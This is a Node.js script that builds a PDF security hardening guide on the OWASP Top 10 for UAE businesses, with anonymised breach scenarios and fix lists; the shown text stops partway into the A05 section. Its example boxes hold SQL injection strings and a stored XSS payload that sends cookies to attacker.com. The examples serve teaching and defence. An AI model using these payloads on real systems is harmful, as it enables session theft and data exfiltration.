#!/usr/bin/env node
// Web Application Security Hardening Guide — PDF Generator
// Run: node scripts/generate-web-app-security-guide.js
// Output: public/downloads/web-application-security-hardening-guide.pdf

const PDFDocument = require("pdfkit");
const fs = require("node:fs");
const path = require("node:path");

const OUTPUT_PATH = path.join(
  __dirname,
  "../public/downloads/web-application-security-hardening-guide.pdf"
);
fs.mkdirSync(path.dirname(OUTPUT_PATH), { recursive: true });

// ── BRAND COLORS ──────────────────────────────────────────────────────────────
const DARK_BG = "#020d18";
const DARK_CARD = "#061424";
const DARK_ROW = "#0a1e2e";
const CYAN = "#18A7B7";
const BLUE = "#1F88BF";
const WHITE = "#ffffff";
const GRAY_700 = "#2d3f50";
const GRAY_500 = "#475569";
const GRAY_300 = "#64748b";
const GRAY_200 = "#94a3b8";
const GRAY_100 = "#cbd5e1";
const BORDER_C = "#1e3a4a";
const RED = "#ef4444";
const ORANGE = "#f97316";
const GREEN = "#22c55e";
const YELLOW = "#eab308";

// ── PAGE GEOMETRY ─────────────────────────────────────────────────────────────
const PAGE_W = 595.28;
const PAGE_H = 841.89;
const ML = 52;
const MR = 52;
const TW = PAGE_W - ML - MR;
const CTOP = 75;
const CBOT = PAGE_H - 52;

// ── DOCUMENT SETUP ────────────────────────────────────────────────────────────
const doc = new PDFDocument({
  size: "A4",
  margins: { top: 55, bottom: 55, left: ML, right: MR },
  bufferPages: true,
  info: {
    Title: "Web Application Security Hardening Guide for UAE Businesses",
    Author: "Nexaguard Cyber Labs",
    Subject: "OWASP Top 10 guide with UAE context and fix guidance",
    Keywords:
      "OWASP, web security, cybersecurity, UAE, penetration testing, hardening",
  },
});

doc.pipe(fs.createWriteStream(OUTPUT_PATH));

// ── GLOBAL STATE ──────────────────────────────────────────────────────────────
let pageNum = 0;
let sectionTag = "";

// ── LOW-LEVEL DRAWING ─────────────────────────────────────────────────────────

function fillBg() {
  doc.save();
  doc.rect(0, 0, PAGE_W, PAGE_H).fill(DARK_BG);
  doc.restore();
}

function drawTopBar() {
  const thirds = PAGE_W / 3;
  doc.rect(0, 0, thirds, 5).fill(CYAN);
  doc.rect(thirds, 0, thirds, 5).fill("#18a0b0");
  doc.rect(thirds * 2, 0, thirds, 5).fill(BLUE);
}

function drawLogoMark(x, y, iconSize) {
  doc
    .roundedRect(x, y, iconSize, iconSize, Math.round(iconSize * 0.18))
    .fill(CYAN);
  const cx = x + iconSize / 2;
  const st = y + iconSize * 0.12;
  const sw = iconSize * 0.55;
  const sh = iconSize * 0.76;
  doc.save();
  doc.fillColor("rgba(255,255,255,0.18)");
  doc
    .moveTo(cx - sw, st)
    .lineTo(cx + sw, st)
    .lineTo(cx + sw, st + sh * 0.55)
    .bezierCurveTo(cx + sw, st + sh * 0.9, cx + sw * 0.3, st + sh, cx, st + sh)
    .bezierCurveTo(
      cx - sw * 0.3,
      st + sh * 0.9,
      cx - sw,
      st + sh * 0.9,
      cx - sw,
      st + sh * 0.55
    )
    .closePath()
    .fill();
  doc.restore();
  const ckX = cx - sw * 0.25;
  const ckY = st + sh * 0.45;
  doc
    .moveTo(ckX, ckY)
    .lineTo(ckX + sw * 0.3, ckY + sh * 0.22)
    .lineTo(ckX + sw * 0.8, ckY - sh * 0.18)
    .strokeColor(WHITE)
    .lineWidth(Math.max(1, iconSize * 0.07))
    .stroke();
}

function drawRunningHeader(tag) {
  drawLogoMark(ML, 14, 26);
  doc
    .fontSize(8)
    .font("Helvetica-Bold")
    .fillColor(WHITE)
    .text("NEXAGUARD", ML + 30, 16, { lineBreak: false });
  doc
    .fontSize(6.5)
    .font("Helvetica-Bold")
    .fillColor(CYAN)
    .text("CYBER LABS", ML + 30, 26, { lineBreak: false });
  if (tag) {
    doc
      .fontSize(7.5)
      .font("Helvetica-Bold")
      .fillColor(CYAN)
      .text(tag.toUpperCase(), PAGE_W - MR - 220, 22, {
        width: 220,
        align: "right",
        lineBreak: false,
      });
  }
  doc.rect(ML, 47, TW, 0.5).fill(GRAY_700);
}

function drawFooter(num) {
  const fy = PAGE_H - 36;
  doc.rect(ML, fy - 6, TW, 0.5).fill(GRAY_700);
  doc
    .fontSize(7.5)
    .font("Helvetica")
    .fillColor(GRAY_300)
    .text(
      "Nexaguard Cyber Labs FZCO  ·  nexaguardcyberlabs.com  ·  CONFIDENTIAL",
      ML,
      fy,
      {
        width: TW - 50,
        align: "left",
        lineBreak: false,
      }
    );
  doc
    .fontSize(7.5)
    .font("Helvetica-Bold")
    .fillColor(CYAN)
    .text(`${num}`, PAGE_W - MR, fy, {
      width: MR - 2,
      align: "right",
      lineBreak: false,
    });
}

// ── PAGE MANAGEMENT ───────────────────────────────────────────────────────────

function addPage(tag) {
  pageNum++;
  sectionTag = tag || sectionTag;
  doc.addPage();
  fillBg();
  drawTopBar();
  drawRunningHeader(sectionTag);
  drawFooter(pageNum);
  doc.y = CTOP;
}

function checkSpace(needed) {
  if (doc.y + (needed || 50) > CBOT) {
    addPage();
  }
}

// ── CONTENT HELPERS ───────────────────────────────────────────────────────────

function sectionBand(eyebrow, title, riskLevel) {
  checkSpace(60);
  const startY = doc.y;
  const bandH = 52;
  let accent = CYAN;
  if (riskLevel === "critical") {
    accent = RED;
  } else if (riskLevel === "high") {
    accent = ORANGE;
  }

  doc.rect(ML, startY, TW, bandH).fill(DARK_CARD);
  doc.rect(ML, startY, 4, bandH).fill(accent);

  doc
    .fontSize(7)
    .font("Helvetica-Bold")
    .fillColor(accent)
    .text(eyebrow.toUpperCase(), ML + 12, startY + 8, {
      width: TW - 24,
      lineBreak: false,
    });
  doc
    .fontSize(16)
    .font("Helvetica-Bold")
    .fillColor(WHITE)
    .text(title, ML + 12, startY + 22, { width: TW - 24, lineBreak: false });

  if (riskLevel) {
    const rLabel = riskLevel.toUpperCase();
    const rColors = { critical: RED, high: ORANGE, medium: YELLOW };
    const rc = rColors[riskLevel] || CYAN;
    const rw = rLabel.length * 5.5 + 10;
    doc
      .roundedRect(PAGE_W - MR - rw - 4, startY + bandH / 2 - 8, rw, 16, 3)
      .fill(rc);
    doc
      .fontSize(7)
      .font("Helvetica-Bold")
      .fillColor(riskLevel === "medium" ? DARK_BG : WHITE)
      .text(rLabel, PAGE_W - MR - rw - 4, startY + bandH / 2 - 3.5, {
        width: rw,
        align: "center",
        lineBreak: false,
      });
  }

  doc.y = startY + bandH + 14;
}

function bodyText(text) {
  const h = doc.heightOfString(text, { width: TW }) + 16;
  checkSpace(h);
  doc
    .fontSize(10)
    .font("Helvetica")
    .fillColor(GRAY_100)
    .text(text, ML, doc.y, { width: TW, lineGap: 3 });
  doc.y += 8;
}

function subHead(text, color) {
  checkSpace(28);
  doc
    .fontSize(11.5)
    .font("Helvetica-Bold")
    .fillColor(color || CYAN)
    .text(text, ML, doc.y, { width: TW });
  doc.y += 5;
}

function bulletList(items, color) {
  for (const text of items) {
    const h = doc.heightOfString(text, { width: TW - 14 }) + 10;
    checkSpace(h);
    const iy = doc.y;
    doc.circle(ML + 4, iy + 6, 2).fill(color || CYAN);
    doc
      .fontSize(9.5)
      .font("Helvetica")
      .fillColor(GRAY_100)
      .text(text, ML + 12, iy, { width: TW - 12, lineGap: 2 });
    doc.y = iy + h - 4;
  }
  doc.y += 4;
}

function fixList(items) {
  checkSpace(24);
  doc
    .fontSize(8)
    .font("Helvetica-Bold")
    .fillColor(GREEN)
    .text("HOW TO FIX", ML, doc.y, { lineBreak: false });
  doc.y += 14;
  for (const text of items) {
    const h = doc.heightOfString(text, { width: TW - 18 }) + 10;
    checkSpace(h);
    const iy = doc.y;
    doc
      .fontSize(10)
      .font("Helvetica-Bold")
      .fillColor(GREEN)
      .text("✓", ML, iy, { lineBreak: false });
    doc
      .fontSize(9.5)
      .font("Helvetica")
      .fillColor(GRAY_100)
      .text(text, ML + 14, iy, { width: TW - 14, lineGap: 2 });
    doc.y = iy + h - 4;
  }
  doc.y += 6;
}

function codeBox(label, code) {
  const codeLines = code.split("\n");
  const lh = 13;
  const boxH = codeLines.length * lh + 28;
  checkSpace(boxH + 8);
  const by = doc.y;
  doc.rect(ML, by, TW, boxH).fill("#0a0f18");
  doc.rect(ML, by, TW, 18).fill("#0f1e2e");
  doc.rect(ML, by, 4, boxH).fill(ORANGE);
  doc.rect(ML, by, TW, boxH).strokeColor(BORDER_C).lineWidth(0.5).stroke();
  doc
    .fontSize(7)
    .font("Helvetica-Bold")
    .fillColor(ORANGE)
    .text(label || "ATTACK EXAMPLE", ML + 10, by + 4, { lineBreak: false });
  for (let i = 0; i < codeLines.length; i++) {
    doc
      .fontSize(9)
      .font("Courier")
      .fillColor(GREEN)
      .text(codeLines[i], ML + 10, by + 22 + i * lh, { lineBreak: false });
  }
  doc.y = by + boxH + 10;
}

function calloutBox(text, type) {
  let accent;
  let label;
  if (type === "warning") {
    accent = ORANGE;
    label = "IMPORTANT";
  } else if (type === "danger") {
    accent = RED;
    label = "CRITICAL RISK";
  } else if (type === "success") {
    accent = GREEN;
    label = "UAE CONTEXT";
  } else {
    accent = CYAN;
    label = "TIP";
  }
  const textH = doc.heightOfString(text, { width: TW - 26 }) + 30;
  checkSpace(textH + 8);
  const by = doc.y;
  doc.rect(ML, by, TW, textH).fill(DARK_CARD);
  doc.rect(ML, by, 4, textH).fill(accent);
  doc
    .fontSize(7)
    .font("Helvetica-Bold")
    .fillColor(accent)
    .text(label, ML + 12, by + 8, { lineBreak: false });
  doc
    .fontSize(10)
    .font("Helvetica")
    .fillColor(GRAY_100)
    .text(text, ML + 12, by + 20, { width: TW - 26, lineGap: 3 });
  doc.y = by + textH + 10;
}

function divider() {
  checkSpace(18);
  doc.rect(ML, doc.y, TW, 0.5).fill(GRAY_700);
  doc.y += 14;
}

function actionRow(period, items) {
  checkSpace(30 + items.length * 16);
  const by = doc.y;
  const textBlock = items.map((i) => `• ${i}`).join("\n");
  const textH = doc.heightOfString(textBlock, { width: TW - 80 }) + 20;
  const rowH = Math.max(textH, 40);
  doc.rect(ML, by, 70, rowH).fill(CYAN);
  doc.rect(ML + 70, by, TW - 70, rowH).fill(DARK_CARD);
  doc.rect(ML, by, TW, rowH).strokeColor(BORDER_C).lineWidth(0.5).stroke();
  doc
    .fontSize(9)
    .font("Helvetica-Bold")
    .fillColor(DARK_BG)
    .text(period, ML, by + (rowH - 10) / 2, {
      width: 70,
      align: "center",
      lineBreak: false,
    });
  let ty = by + 10;
  for (const item of items) {
    const ih = doc.heightOfString(`• ${item}`, { width: TW - 86 }) + 4;
    doc
      .fontSize(9)
      .font("Helvetica")
      .fillColor(GRAY_100)
      .text(`• ${item}`, ML + 78, ty, { width: TW - 86, lineGap: 2 });
    ty += ih;
  }
  doc.y = by + rowH + 2;
}

function headerRow(cols, widths) {
  checkSpace(22);
  const hy = doc.y;
  let x = ML;
  for (let i = 0; i < cols.length; i++) {
    doc.rect(x, hy, widths[i], 18).fill(BLUE);
    doc
      .fontSize(8)
      .font("Helvetica-Bold")
      .fillColor(WHITE)
      .text(cols[i], x + 5, hy + 4, {
        width: widths[i] - 10,
        lineBreak: false,
      });
    x += widths[i];
  }
  doc.y = hy + 18;
}

function tableRow(cols, widths, colors) {
  const maxH = Math.max(
    ...cols.map((c, i) => doc.heightOfString(c, { width: widths[i] - 10 }) + 14)
  );
  checkSpace(maxH + 2);
  const ry = doc.y;
  let x = ML;
  for (let i = 0; i < cols.length; i++) {
    const bg = i % 2 === 0 ? DARK_CARD : DARK_ROW;
    doc.rect(x, ry, widths[i], maxH).fill(bg);
    doc
      .rect(x, ry, widths[i], maxH)
      .strokeColor(BORDER_C)
      .lineWidth(0.5)
      .stroke();
    const tc = colors?.[i] ? colors[i] : GRAY_100;
    doc
      .fontSize(8.5)
      .font("Helvetica")
      .fillColor(tc)
      .text(cols[i], x + 5, ry + 7, { width: widths[i] - 10, lineGap: 2 });
    x += widths[i];
  }
  doc.y = ry + maxH;
}

// ════════════════════════════════════════════════════════════════════════════
// PAGE 1 — COVER
// ════════════════════════════════════════════════════════════════════════════
pageNum = 1;
fillBg();

// Gradient top bar
for (let i = 0; i < 5; i++) {
  const frac = i / 4;
  const r = Math.round(0x18 + (0x1f - 0x18) * frac);
  const g = Math.round(0xa7 + (0x88 - 0xa7) * frac);
  const b = Math.round(0xb7 + (0xbf - 0xb7) * frac);
  const hex = `#${r.toString(16).padStart(2, "0")}${g.toString(16).padStart(2, "0")}${b.toString(16).padStart(2, "0")}`;
  doc.rect(PAGE_W * (i / 5), 0, PAGE_W / 5, 7).fill(hex);
}
doc.rect(0, PAGE_H - 7, PAGE_W, 7).fill(CYAN);

// Logo + wordmark
const logoSize = 64;
const lx = (PAGE_W - logoSize - 10 - 140) / 2;
drawLogoMark(lx, 78, logoSize);
doc
  .fontSize(27)
  .font("Helvetica-Bold")
  .fillColor(WHITE)
  .text("NEXAGUARD", lx + logoSize + 14, 84, { lineBreak: false });
doc
  .fontSize(11)
  .font("Helvetica-Bold")
  .fillColor(CYAN)
  .text("CYBER  LABS", lx + logoSize + 14, 116, { lineBreak: false });

doc.rect(ML, 162, TW, 1).fill(GRAY_700);

// OWASP badge
const bw2 = 200;
const bx2 = (PAGE_W - bw2) / 2;
doc
  .roundedRect(bx2, 174, bw2, 24, 4)
  .strokeColor(ORANGE)
  .lineWidth(0.8)
  .stroke();
doc
  .fontSize(8)
  .font("Helvetica-Bold")
  .fillColor(ORANGE)
  .text("OWASP TOP 10  ·  EDITION 1  ·  2026", bx2, 183, {
    width: bw2,
    align: "center",
    lineBreak: false,
  });

// Title
doc
  .fontSize(30)
  .font("Helvetica-Bold")
  .fillColor(WHITE)
  .text("Web Application", ML, 212, { width: TW, align: "center" });
doc
  .fontSize(30)
  .font("Helvetica-Bold")
  .fillColor(CYAN)
  .text("Security Hardening", ML, doc.y + 3, { width: TW, align: "center" });
doc
  .fontSize(30)
  .font("Helvetica-Bold")
  .fillColor(WHITE)
  .text("Guide for UAE Businesses", ML, doc.y + 3, {
    width: TW,
    align: "center",
  });

// Subtitle
doc
  .fontSize(11.5)
  .font("Helvetica")
  .fillColor(GRAY_200)
  .text(
    "OWASP Top 10 in plain language — with real-world UAE scenarios,\n" +
      "specific fix guidance, and security headers reference.",
    ML,
    doc.y + 16,
    { width: TW, align: "center", lineGap: 4 }
  );

// Feature cards
const fc = { w: (TW - 16) / 3, h: 62, y: PAGE_H - 200 };
const coverFeatures = [
  { icon: "10", label: "OWASP Vulnerabilities\nWith Full Fix Guidance" },
  { icon: "UAE", label: "Regional Context &\nReal Breach Scenarios" },
  { icon: "→", label: "3-Month Action\nPlan Included" },
];
for (let i = 0; i < coverFeatures.length; i++) {
  const item = coverFeatures[i];
  const cx = ML + i * (fc.w + 8);
  doc.roundedRect(cx, fc.y, fc.w, fc.h, 6).fill(DARK_CARD);
  doc.rect(cx, fc.y, fc.w, 3).fill(i === 1 ? ORANGE : CYAN);
  doc
    .fontSize(18)
    .font("Helvetica-Bold")
    .fillColor(i === 1 ? ORANGE : CYAN)
    .text(item.icon, cx, fc.y + 10, {
      width: fc.w,
      align: "center",
      lineBreak: false,
    });
  doc
    .fontSize(9)
    .font("Helvetica")
    .fillColor(GRAY_200)
    .text(item.label, cx, fc.y + 34, {
      width: fc.w,
      align: "center",
      lineGap: 2,
    });
}

doc
  .fontSize(9)
  .font("Helvetica")
  .fillColor(GRAY_300)
  .text("Prepared by Nexaguard Cyber Labs · Dubai, UAE", ML, PAGE_H - 126, {
    width: TW,
    align: "center",
    lineBreak: false,
  });
doc
  .fontSize(8)
  .font("Helvetica")
  .fillColor(GRAY_500)
  .text(
    "© 2026 Nexaguard Cyber Labs FZCO · All rights reserved",
    ML,
    PAGE_H - 110,
    {
      width: TW,
      align: "center",
      lineBreak: false,
    }
  );

// ════════════════════════════════════════════════════════════════════════════
// PAGE 2 — FOREWORD
// ════════════════════════════════════════════════════════════════════════════
addPage("Foreword");
sectionBand("FROM THE PRACTITIONERS", "A Note on This Guide");

bodyText(
  "The vast majority of UAE businesses run on web applications — customer portals, internal tools, " +
    "e-commerce platforms, partner APIs. Most of these were built quickly, by small teams, with " +
    "security treated as a future concern. That is not a moral failing. It is how products get built."
);
bodyText(
  "The problem is that attackers know this, and they systematically exploit it. Automated scanning " +
    "tools probe the internet 24 hours a day looking for the vulnerabilities described in this guide. " +
    "If your applications have them, they will be found — the question is whether you find them first."
);
bodyText(
  "This guide is built around the OWASP Top 10 — the industry standard for web application security risks. " +
    "We have rewritten each vulnerability for the people who actually need to act on them: CTOs, IT leads, " +
    "engineering managers, and founders. Not security researchers."
);
bodyText(
  "For each vulnerability you will find: what it is, why it matters specifically in the UAE regulatory " +
    "context, what real attack patterns look like, and the specific steps to address it. The final sections " +
    "give you a structured action plan and a security headers quick-reference."
);
bodyText(
  "Walk through this guide with your engineering team. Mark what is already in place, what is not, and " +
    "what needs urgent attention. Treat it as the first step in a programme — not a one-time exercise."
);

doc
  .fontSize(12)
  .font("Helvetica-Bold")
  .fillColor(CYAN)
  .text("— Nexaguard Cyber Labs", ML, doc.y + 4);
doc.y += 20;

divider();
subHead("How This Guide Is Structured");

const structureItems = [
  "Pages 3–4: UAE threat context and two anonymised breach scenarios",
  "Pages 5–14: One page per OWASP vulnerability (A01–A10) with fix guidance",
  "Page 15: 90-day action plan — this week, this month, this quarter",
  "Page 16: Security headers quick-reference table",
  "Page 17: About Nexaguard and how to get support",
];
for (const t of structureItems) {
  checkSpace(18);
  const iy = doc.y;
  doc.circle(ML + 4, iy + 6, 2).fill(CYAN);
  doc
    .fontSize(9.5)
    .font("Helvetica")
    .fillColor(GRAY_100)
    .text(t, ML + 12, iy, { width: TW - 12, lineBreak: false });
  doc.y = iy + 16;
}

doc.y += 10;
calloutBox(
  "Every vulnerability in this guide has been observed by the Nexaguard team in real UAE production " +
    "environments. The scenarios are anonymised composites based on actual VAPT engagements and incident " +
    "response cases from across the UAE and GCC.",
  "tip"
);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 3 — UAE THREAT CONTEXT
// ════════════════════════════════════════════════════════════════════════════
addPage("UAE Threat Context");
sectionBand(
  "REAL-WORLD CONTEXT",
  "How Vulnerabilities Get Exploited — UAE Scenarios"
);

bodyText(
  "Before walking through the OWASP Top 10, two anonymised scenarios representing patterns we see " +
    "repeatedly in UAE engagements. Both illustrate vulnerabilities covered in this guide."
);

doc.y += 4;

// Scenario 1
checkSpace(130);
const s1y = doc.y;
doc.rect(ML, s1y, TW, 118).fill(DARK_CARD);
doc.rect(ML, s1y, 4, 118).fill(RED);
doc
  .fontSize(8)
  .font("Helvetica-Bold")
  .fillColor(RED)
  .text("SCENARIO 1  ·  DUBAI-BASED SAAS COMPANY", ML + 12, s1y + 8, {
    lineBreak: false,
  });
doc
  .fontSize(11)
  .font("Helvetica-Bold")
  .fillColor(WHITE)
  .text("SQL Injection via Customer Search Feature", ML + 12, s1y + 20, {
    width: TW - 28,
    lineBreak: false,
  });
doc
  .fontSize(9.5)
  .font("Helvetica")
  .fillColor(GRAY_100)
  .text(
    "A customer portal included a product search function. The development team did not use parameterised " +
      "queries. An attacker used automated tooling to inject SQL through the search parameter, " +
      "exfiltrating the entire customer database — 40,000+ records including names, emails, phone numbers, and " +
      "order history. The breach ran undetected for 72 hours. It was discovered on a Monday morning when a " +
      "customer reported receiving a phishing email using information only held by the company.",
    ML + 12,
    s1y + 36,
    { width: TW - 28, lineGap: 3 }
  );
doc
  .fontSize(9)
  .font("Helvetica-Bold")
  .fillColor(ORANGE)
  .text(
    "Estimated cost: AED 850,000 in incident response, regulatory reporting, customer notification, " +
      "legal fees, and lost enterprise contracts requiring evidence of VAPT.",
    ML + 12,
    s1y + 92,
    { width: TW - 28, lineBreak: false }
  );
doc.y = s1y + 118 + 10;

// Scenario 2
checkSpace(130);
const s2y = doc.y;
doc.rect(ML, s2y, TW, 118).fill(DARK_CARD);
doc.rect(ML, s2y, 4, 118).fill(ORANGE);
doc
  .fontSize(8)
  .font("Helvetica-Bold")
  .fillColor(ORANGE)
  .text("SCENARIO 2  ·  ABU DHABI E-COMMERCE STARTUP", ML + 12, s2y + 8, {
    lineBreak: false,
  });
doc
  .fontSize(11)
  .font("Helvetica-Bold")
  .fillColor(WHITE)
  .text("Broken Authentication — JWT Token Forgery", ML + 12, s2y + 20, {
    width: TW - 28,
    lineBreak: false,
  });
doc
  .fontSize(9.5)
  .font("Helvetica")
  .fillColor(GRAY_100)
  .text(
    "The application used JSON Web Tokens (JWT) for authentication but the backend never validated " +
      "the token signature server-side — it trusted the claims inside the token unconditionally. " +
      "An attacker forged a token claiming the 'admin' role, accessed the admin panel, downloaded " +
      "the full customer and order database, then pivoted to the payment processor integration. " +
      "The company discovered the breach via a suspicious transaction alert from their bank.",
    ML + 12,
    s2y + 36,
    { width: TW - 28, lineGap: 3 }
  );
doc
  .fontSize(9)
  .font("Helvetica-Bold")
  .fillColor(ORANGE)
  .text(
    "Outcome: Complete brand reset, regulatory notification required, 18-month recovery period, " +
      "product rebuild from a security-first architecture.",
    ML + 12,
    s2y + 92,
    { width: TW - 28, lineBreak: false }
  );
doc.y = s2y + 118 + 12;

bodyText(
  "These scenarios illustrate two vulnerabilities you will find detailed in this guide: OWASP A03 (Injection) " +
    "and OWASP A07 (Authentication Failures). The attack techniques used in both cases are automated — " +
    "they require no human skill to execute once the vulnerability exists."
);

calloutBox(
  "In both cases, the vulnerabilities were present for months before exploitation. A single annual " +
    "penetration test or a quarterly automated scan would have surfaced both issues before an attacker did.",
  "warning"
);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 4 — OWASP A01: BROKEN ACCESS CONTROL
// ════════════════════════════════════════════════════════════════════════════
addPage("OWASP A01");
sectionBand(
  "OWASP A01  ·  RANK #1 MOST PREVALENT",
  "Broken Access Control",
  "critical"
);

bodyText(
  "Broken access control lets users do things they are not authorised to do: read another customer's " +
    "data, modify another user's profile, access administrator-only features, or perform actions without " +
    "proper authorisation. It is the most prevalent vulnerability in the OWASP Top 10."
);

calloutBox(
  "UAE PDPL (Federal Decree-Law No. 45 of 2021) requires that personal data is accessed only by " +
    "authorised parties. A broken access control vulnerability is a direct PDPL breach. Multi-tenant " +
    "SaaS products where one tenant can access another's data are particularly high-risk.",
  "success"
);

subHead("What Attack Patterns Look Like");
bulletList(
  [
    "IDOR — changing /api/orders/1234 to /api/orders/1235 returns another customer's order",
    "Missing role validation — calling /admin/users without checking if the caller is an admin",
    "JWT privilege escalation — modifying the 'role' claim in a token to 'admin'",
    "Forced browsing — navigating directly to /admin/dashboard without a valid admin session",
    "CORS misconfiguration — cross-origin requests accepted from any origin without validation",
    "Horizontal privilege escalation — User A modifies their account ID to access User B's data",
  ],
  RED
);

codeBox(
  "IDOR ATTACK EXAMPLE",
  "GET /api/v1/invoices/INV-00847 HTTP/1.1  → 200 OK (your invoice)\n" +
    "GET /api/v1/invoices/INV-00846 HTTP/1.1  → 200 OK (another customer's invoice)\n" +
    "GET /api/v1/invoices/INV-00001 HTTP/1.1  → 200 OK (first customer in the database)"
);

fixList([
  "Default-deny — every endpoint requires explicit permission grants, not opt-out access",
  "Verify record ownership server-side on every data access request, not just role checks",
  "Use indirect object references (UUIDs, hashed IDs) — never expose sequential integer IDs",
  "Implement centralised authorisation logic — not scattered checks across the codebase",
  "Log every access control failure — bulk failures indicate active probing or attack",
  "Write automated access control tests in your CI/CD pipeline before each deployment",
  "Enforce row-level security in multi-tenant databases — tenants must be isolated at the DB layer",
]);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 5 — OWASP A02: CRYPTOGRAPHIC FAILURES
// ════════════════════════════════════════════════════════════════════════════
addPage("OWASP A02");
sectionBand(
  "OWASP A02  ·  FORMERLY 'SENSITIVE DATA EXPOSURE'",
  "Cryptographic Failures",
  "critical"
);

bodyText(
  "Sensitive data is exposed because it is stored, transmitted, or hashed using weak or absent " +
    "cryptographic controls. This includes unencrypted database fields, weak password hashing, " +
    "deprecated TLS versions, and sensitive responses leaked through caching or logging."
);

calloutBox(
  "UAE PDPL and CBUAE guidance both treat unencrypted personal and financial data as a significant " +
    "compliance failure. Regulatory penalties aside, the reputational damage in a breach disclosure " +
    "is often permanent for the businesses affected.",
  "success"
);

subHead("Most Common Cryptographic Failures in UAE Environments");
bulletList(
  [
    "TLS 1.0 or 1.1 still enabled on production web servers (deprecated, known-exploitable)",
    "Passwords hashed with MD5 or SHA-1 — both are trivially reversible with modern hardware",
    "Sensitive fields (Emirates IDs, passport numbers, payment data) stored as plain text in databases",
    "Sensitive data written to application logs or error tracking systems in clear text",
    "Overly permissive Cache-Control headers causing browsers or CDNs to cache sensitive responses",
    "API keys and database credentials hard-coded in source code or environment files committed to git",
    "Self-signed TLS certificates in production bypassed with insecure HTTP fallback paths",
  ],
  ORANGE
);

subHead("Technical Fix Guidance");
fixList([
  "Enforce TLS 1.2 minimum on all endpoints (TLS 1.3 preferred). Disable TLS 1.0, 1.1, SSL 3.0",
  "Use bcrypt (cost factor ≥ 12), Argon2id, or scrypt for password hashing — never MD5 / SHA-1 / SHA-256",
  "Encrypt sensitive database fields at rest with AES-256-GCM or equivalent authenticated encryption",
  "Validate TLS configuration monthly via SSL Labs (target A or A+) — flag any regressions immediately",
  "Set Cache-Control: no-store on all responses containing sensitive or user-specific data",
  "Use a secrets manager (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault) — never .env in git",
  "Audit npm / pip / Maven packages for cryptographic library versions annually — update promptly",
]);

codeBox(
  "CORRECT PASSWORD HASHING (Node.js)",
  "// WRONG — never use this:\nconst hash = md5(password);\n\n" +
    "// CORRECT — use bcrypt:\nconst bcrypt = require('bcrypt');\nconst hash = await bcrypt.hash(password, 12);\n" +
    "const valid = await bcrypt.compare(candidate, hash);"
);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 6 — OWASP A03: INJECTION
// ════════════════════════════════════════════════════════════════════════════
addPage("OWASP A03");
sectionBand(
  "OWASP A03  ·  MOST EXPLOITED IN UAE ENGAGEMENTS",
  "Injection — SQL, XSS, Command",
  "critical"
);

bodyText(
  "Injection vulnerabilities occur when user-supplied data is treated as code or commands. The attacker " +
    "crafts input that breaks out of its intended context and executes arbitrary code, queries, or commands. " +
    "SQL Injection remains the most common critical finding in our VAPT engagements across the UAE."
);

subHead("Injection Types and Attack Examples");

codeBox(
  "SQL INJECTION",
  "Normal: SELECT * FROM products WHERE name = 'laptop'\n\n" +
    "Attack: SELECT * FROM products WHERE name = '' OR '1'='1'\n" +
    "Result: Returns ALL products (authentication bypass pattern)\n\n" +
    "Exfil:  ' UNION SELECT username,password,null FROM users--\n" +
    "Result: Dumps the entire user credentials table"
);

codeBox(
  "STORED XSS (Cross-Site Scripting)",
  "Comment field input by attacker:\n" +
    "<script>fetch('https://attacker.com/c?d='+document.cookie)</script>\n\n" +
    "When any user views the page, their session cookie is sent to the attacker.\n" +
    "Attacker uses the cookie to impersonate the victim's account."
);

subHead("Why UAE Applications Are Particularly Vulnerable");
bulletList(
  [
    "CMS platforms (WordPress, Drupal) with outdated plugins remain a primary injection vector",
    "Rapid development cycles in startup environments skip input validation as a 'later' task",
    "Legacy PHP applications with string-concatenated queries still common in UAE-hosted systems",
    "Custom-built ERPs and internal tools rarely go through security testing before production",
  ],
  RED
);

fixList([
  "Use parameterised queries or prepared statements — NEVER concatenate user input into SQL strings",
  "Use ORM frameworks correctly (Sequelize, Prisma, Eloquent) — they parameterise by default when used correctly",
  "Encode user input for context before rendering in HTML: HTML-encode for HTML, JS-encode for scripts",
  "Implement Content Security Policy (CSP) headers to limit the impact of any XSS that does occur",
  "Never pass user-supplied input to OS shell commands — use language-native APIs with typed parameters",
  "Apply a WAF as a defence-in-depth layer (Cloudflare, AWS WAF) — not a substitute for secure code",
  "Run static analysis (SAST) tools on every codebase to catch injection patterns before deployment",
]);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 7 — OWASP A04: INSECURE DESIGN
// ════════════════════════════════════════════════════════════════════════════
addPage("OWASP A04");
sectionBand("OWASP A04  ·  ARCHITECTURAL RISK", "Insecure Design", "high");

bodyText(
  "Insecure design refers to security flaws baked into the architecture itself — not implementation bugs, " +
    "but fundamental design choices that cannot be fixed with a patch. These require redesign. " +
    "The distinction matters: insecure design means a feature is inherently unsafe by how it was conceived."
);

subHead("Common Insecure Design Patterns");
bulletList(
  [
    "Login endpoint with no rate limiting — allows automated brute-force or password spray attacks",
    "Account enumeration — 'email not found' vs 'wrong password' responses reveal valid accounts",
    "Password reset flows that leak user existence or use predictable tokens",
    "Password reset links that never expire — valid indefinitely after generation",
    "Business logic that can be bypassed by skipping workflow steps (e.g., payment → skip → confirmation)",
    "Coupon or discount systems without per-user or per-account limits — economically exploitable",
    "Admin features accessible via predictable URL patterns with only client-side access checks",
  ],
  ORANGE
);

subHead("How to Address Design-Level Vulnerabilities");
fixList([
  "Threat model during the design phase — for each feature, ask 'what could an attacker do with this?'",
  "Apply defence-in-depth: assume any single control will be bypassed, build multiple layers",
  "Rate limit ALL authentication endpoints: login, password reset, email verification, OTP",
  "Use generic error messages for authentication: 'Invalid credentials' regardless of which is wrong",
  "Expire all tokens: password reset tokens valid for 15 minutes maximum, single-use only",
  "Validate business logic sequences server-side — never trust client to enforce workflow order",
  "Engage security review during design (not just pre-launch) — architecture changes are cheapest early",
]);

calloutBox(
  "The most expensive vulnerabilities to fix are insecure design flaws discovered in production. " +
    "A 2-hour threat modelling session during the design phase costs less than 1% of the average " +
    "post-breach remediation cost. Budget for it.",
  "warning"
);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 8 — OWASP A05: SECURITY MISCONFIGURATION
// ════════════════════════════════════════════════════════════════════════════
addPage("OWASP A05");
sectionBand(
  "OWASP A05  ·  MOST COMMON IN CLOUD ENVIRONMENTS",
  "Security Misconfiguration",
